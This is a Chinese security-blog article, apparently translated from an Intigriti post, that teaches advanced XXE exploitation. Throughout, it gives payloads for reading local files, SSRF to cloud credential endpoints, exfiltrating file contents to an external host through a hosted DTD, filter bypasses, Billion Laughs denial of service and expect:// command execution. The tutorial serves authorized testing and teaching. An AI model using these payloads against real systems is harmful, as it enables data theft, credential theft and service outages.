#  XXE漏洞各种骚姿势   
 迪哥讲事   2025-03-14 17:33  
  
<table><tbody><tr><td data-colwidth="557" width="557" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph="" style="white-space: normal;outline: 0px;max-width: 100%;font-family: -apple-system, system-ui, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-size: 15px;"><span leaf="">声明：</span></span></strong></span><span style="font-size: 15px;"></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="font-size: 15px;"><span leaf="">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</span></span></span></h1></td></tr></tbody></table>#   
  
#   
  
****# 防走失：https://gugesay.com/archives/4086  
  
******不想错过任何消息？设置星标****↓ ↓ ↓**  
****  
#   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlbXyV4tJfwXpicwdZ2gTB6XtwoqRvbaCy3UgU1Upgn094oibelRBGyMs5GgicFKNkW1f62QPCwGwKxA/640?wx_fmt=png&from=appmsg "")  
  
# 前言  
  
XML 外部实体（XXE）漏洞是现代网络应用程序中最常被忽视但影响最大的漏洞之一。尽管它们似乎变得更难检测和利用，但其影响仍然严重，往往允许攻击者读取内部文件、访问内部网络，并在严重情况下甚至执行远程代码执行！  
  
通过本文我们将学习什么是 XXE 漏洞，以及如何识别和利用它们，同时本文还将涵盖一些高级利用案例。  
  
让我们开始吧～  
# 什么 XXE 注入漏洞？  
  
XML 外部实体（XXE）注入是一种漏洞类别，允许攻击者操控 XML 数据，意图利用解析器的功能。这通常会导致攻击者能够诱使易受攻击的应用组件向任意主机发起外部 HTTP 连接（服务器端请求伪造），读取内部文件，或者在严重情况下，甚至通过远程代码执行获得机器访问权限。  
# 识别 XXE 注入漏洞  
- 基于 XML 的 Web 服务（SOAP、REST 和 RPC API，接受并处理 XML 格式的数据）  
  
- 任何导入/导出功能，以 XML 格式交付或接受数据  
  
- RSS/Atom 订阅处理器  
  
- 文档查看器/转换器（任何处理基于 XML 的文档的功能，如 DOCX、XLSX 等）  
  
- 文件上传处理 XML（如 SVG 图像处理器）  
  
一个经验法则是始终寻找任何接受和处理任意 XML 格式数据的应用组件。  
  
一些 REST API 会（无意中）配置为接受多种格式的数据，包括 XML。**因此总是测试渗透目标可能接受的内容是值得的。**  
##  自动化识别   
  
在Burp中，添加一个Match and Replace规则，将内容类型"application/json"改为"text/xml"：  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jkYiavzeYvMk0sRK5N9f91HUGCJzGhiaYldPz8xc9c45ibjKr4bibhMYSCq8RO8OicDKHias9jul9qfxNHg/640?wx_fmt=png&from=appmsg "")  
  
Burp设置  
  
现在我们知道了什么是 XXE 漏洞以及在哪里找到它们，接下来让我们看看我们如何利用它们。  
# 简单的 XXE 漏洞利用  
  
让我们先从通过一个易受攻击的组件理解 XXE 漏洞开始。看看下面的易受攻击的代码片段：  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jkYiavzeYvMk0sRK5N9f91HUgcLBsZAuf30QkKBjydkOwGfBzr2N3vOFaMAIo6RP52xUmho0zo7llg/640?wx_fmt=png&from=appmsg "")  
  
易受攻击的代码片段案例  
  
分析上面的代码片段，我们可以发现一些问题：  
- 没有充分的用户输入验证  
  
- XML 解析器支持 XML 实体（参见 LIBXML_NOENT）  
  
- XML 解析器配置为自动加载外部 DTD（文档类型定义，参见 LIBXML_DTDLOAD）  
  
以上这 3 个条件都有助于实现 XXE 攻击，发送恶意Payloads如下所示，我们很容易加载在外部实体中指定的本地文件：  
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [  <!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>    <post>        <post_title>&xxe;</post_title>        <post_desc>...</post_desc>    </post></data>
```  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jkYiavzeYvMk0sRK5N9f91HUO4bxI6AkLhWicvicvnpncu8J1B3ukXcOoKb500kVibKzoEyjr5c4odWWA/640?wx_fmt=png&from=appmsg "")  
  
利用简单的 XML 外部实体（XXE）注入漏洞  
# 从 XXE 到 SSRF  
  
同样地，我们也可以声明一个远程 URL，而不是本地文件，以执行服务器端请求伪造攻击并获取响应。  
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [  <!ENTITY ssrf SYSTEM "https://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]><data>    <post>        <post_title>&ssrf;</post_title>        <post_desc>...</post_desc>    </post></data>
```  
  
当然，找到上述容易受到简单 XXE 注入漏洞的应用组件是非常少见的，特别是随着 Web 开发者安全意识的提高和针对 XXE 等危险注入攻击的新内置安全功能的出现。  
  
让我们来看看更高级的利用案例。  
  
注意：在本例中，我们简化了 XXE 攻击，使其反映整个用户输入数据对象，在实际场景中，你可能需要尝试注入不同的参数并观察响应变化。  
# XXE 高级利用  
##  利用外部 DTD 进行 XXE 攻击   
  
在某些情况下，你会遇到过滤掉 file://  
 协议并用空值或完全阻止它的目标。  
  
为了绕过这一点，我们可以利用 XML 中的一个特殊功能，即文档类型定义（DTD）。  
  
DTD 本质上是一个文件，指定了我们在恶意 XML 结构中使用的实体。  
  
现在，与其像之前那样本地声明它（并让安全过滤器移除我们的 file://  
 协议），我们可以在外部文件中声明我们的 DTD 并完全绕过过滤。  
  
假设我们在服务器上托管了以下文档类型定义（DTD）文件：  
```
<!ENTITY % hostname SYSTEM "file:///etc/hostname"><!ENTITY % e "<!ENTITY &#x25; xxe SYSTEM 'http://example.com/?c=%hostname;'>">%e;%xxe;
```  
  
我们可以构建一种 XXE Payload，使易受攻击的应用程序能够访问我们的服务器，从而加载我们恶意的 DTD 文件并执行其内容：  
```
<!DOCTYPE root [<!ENTITY % xxe SYSTEM "https://example.com/xxe.dtd"> %xxe;]>
```  
  
使用这种方法，我们不再需要向易受攻击的服务器指定被过滤的 file://  
 协议，同时还能泄露内部文件内容！  
##  利用参数实体的 xxe 盲注   
  
一些开发者会尝试采取主动措施防止 XXE 攻击，并尝试从用户输入中去除实体。  
  
众所周知，XML 实体（相当于一个变量）的声明和使用格式如下：  
```
<!DOCTYPE root [  <!ENTITY name "This text will replace &name; when used">]><root>&name;</root>
```  
  
过滤掉and和符号（＆）通常是一件合乎逻辑的事情，但是，我们可以通过使用参数实体轻松绕过这一点。  
  
参数实体用一个百分比符号（<!ENTITY % name "value">  
）定义，并用以下语法引用：％name;  
  
它们只能在 DTD 本身中引用，这里有一个使用参数实体加载外部资源的 XXE Payload 示例：  
```
<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://example.com/"> %xxe;]><root></root>
```  
  
通过这种方法，我们可以利用参数实体来绕过阻止常规外部实体的保护和过滤。  
##  通过资源耗尽的XXE利用   
  
正如之前提到的，XML 解析器的安全配置错误可能会打开新的攻击向量，并允许我们利用 XXE 漏洞。  
  
在某些情况下，当实体扩展限制未设置时，我们几乎可以利用这一点来指数级扩展外部实体。  
  
指数级实体扩展，也被称为“Billion Laughs”攻击，利用递归实体声明，导致高内存消耗甚至系统崩溃：  
```
<!DOCTYPE root [  <!ENTITY e "e">  <!ENTITY e1 "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">  <!ENTITY e2 "&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;">  <!ENTITY e3 "&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;">  <!-- ... -->]><root>&e9;</root>
```  
  
这种攻击特别危险，因为Payload本身相对较小，而在解析过程中会扩展，从而完全耗尽服务器资源。  
  
**提醒：**  
 在进行拒绝服务（DoS）攻击测试时，请始终遵守程序指南，并仅在获准的情况下进行！  
##  通过 UTF-7 编码利用 XXE   
  
你可能已经注意到了，在我们所有的 XXE Payloads中，我们只使用了 UTF-8 编码。  
  
如之前所见，一些过滤规则主要涉及删除恶意关键词和语法符号。  
  
然而，如果解析器配置为接受多种字符编码，我们实际上可以将恶意Payload以 UTF-7 而不是 UTF-8 进行编码：  
```
<?xml version="1.0" encoding="UTF-7"?>+ADw-+ACE-DOCTYPE+ACA-data+ACA-+AFs-+AAo-+ACA-+ACA-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AAo-+AF0-+AD4-+AAo-+ADw-data+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ADw-post+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ADw-post+AF8-title+AD4-+ACY-xxe+ADs-+ADw-/post+AF8-title+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ADw-post+AF8-desc+AD4-xyz+ADw-/post+AF8-desc+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ADw-/post+AD4-+AAo-+ADw-/data+AD4-
```  
  
这种做法可以帮助我们绕过多种输入验证限制，尤其是那些基于黑名单关键词过滤以防止 XXE 注入攻击的系统。  
  
**提示：**  
 记得在你的Payload中包含 XML 声明，并将编码设置为"UTF-7"！  
##  将 XXE 升级为远程代码执行（RCE）   
  
在某些情况下，可能超出读取系统文件或访问内部网络的范围。例如，当启用 Expect PHP 模块时，我们实际上可以使用包装器执行系统命令：  
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [  <!ENTITY exec SYSTEM "expect://whoami">]><data>    <post>        <post_title>whoami: &exec;</post_title>        <post_desc>...</post_desc>    </post></data>
```  
  
这个特定的 PHP 模块允许开发者通过 PTY 与进程进行交互，我们还可以使用其它几种包装器来提升初始的 XXE 漏洞：  
- PHP filter wrapper  
  
- PHP archive wrapper (PHAR)  
  
- ZIP/JAR wrapper (used to read files in archives)  
  
- Data  
  
- Gopher  
  
- FTP  
  
- Dict  
  
### PHP filter wrapper  
  
PHP filter wrapper 是 PHP 过滤扩展的一部分，旨在帮助开发人员过滤、清理和验证数据，我们可以使用这个包装器来读取本地文件（例如 PHP 源代码）：  
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/path/to/file.php">]><data>    <post>        <post_title>&xxe;</post_title>        <post_desc>...</post_desc>    </post></data>
```  
  
此 PHP 过滤器会将我们的 PHP 文件内容编码为 base64，并将其返回给我们。  
### PHAR  
  
PHAR 是 PHP 存档包装器扩展的一部分，用于允许开发人员访问 PHAR 文件内的文件（一个包含 PHP 应用程序或库的单一文件），我们可以使用此包装器来泄露内部 PHAR 文件中的 PHP 文件内容：  
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [  <!ENTITY xxe SYSTEM "phar:///path/to/file.phar/internal/file.php">]><data>    <post>        <post_title>&xxe;</post_title>        <post_desc>...</post_desc>    </post></data>
```  
  
这个包装器也可以帮助触发不安全的反序列化漏洞。  
  
**PS: 有些包装器不被原生支持，使用前需要启用相应的扩展/模块！**  
### XXE 二段注入  
  
XXE 二段注入是一种比 XXE 攻击更为复杂的变体，其中恶意Payload首先被存储，然后检索并执行，二段漏洞由于执行的不可预测性和延迟性，通常更难被识别和利用。  
  
这种情况通常发生在导入功能，这类功能通常是为了异步运行而开发的。  
  
首先，通过上传文件提供恶意输入，然后，导入请求将被排队，之后后台服务器（易受攻击的组件）将处理你的Payload。  
  
一个经验法则是确保在整个 Web 应用程序或 API 中跟踪所有 XML 数据流，而不仅仅是入口点。  
  
如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5EMr3X76qdKBrhIIkBlVVyuiaiasseFZ9LqtibyKFk7gXvgTU2C2yEwKLaaqfX0DL3eoH6gTcNLJvDQ/640?wx_fmt=png&from=appmsg "")  
  
往期回顾  
  
[一款bp神器](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495880&idx=1&sn=65d42fbff5e198509e55072674ac5283&chksm=e8a5faabdfd273bd55df8f7db3d644d3102d7382020234741e37ca29e963eace13dd17fcabdd&scene=21#wechat_redirect)  
  
  
[挖掘有回显ssrf的隐藏payload](https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496898&idx=1&sn=b6088e20a8b4fc9fbd887b900d8c5247&scene=21#wechat_redirect)  
  
  
[ssrf绕过新思路](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495841&idx=1&sn=bbf477afa30391b8072d23469645d026&chksm=e8a5fac2dfd273d42344f18c7c6f0f7a158cca94041c4c4db330c3adf2d1f77f062dcaf6c5e0&scene=21#wechat_redirect)  
  
  
[一个辅助测试ssrf的工具](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496380&idx=1&sn=78c0c4c67821f5ecbe4f3947b567eeec&chksm=e8a5f8dfdfd271c935aeb4444ea7e928c55cb4c823c51f1067f267699d71a1aad086cf203b99&scene=21#wechat_redirect)  
  
  
[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)  
  
  
[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
[](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
  
  
[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试注册功能以及相关Tips‍](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
  
  
# 结论  
  
XXE 漏洞在 Web 应用程序中仍然存在，但由于加强了安全措施和开发人员的安全意识提高，它们变得更加难以发现。  
  
始终测试目标是否存在潜在的 XXE 漏洞是个好主意，尤其是针对本文中提到的所有利用方法。  
  
你学会了么？  
  
以上内容由骨哥翻译并整理。  
  
原文：https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-advanced-xxe-vulnerabilities  
  
  
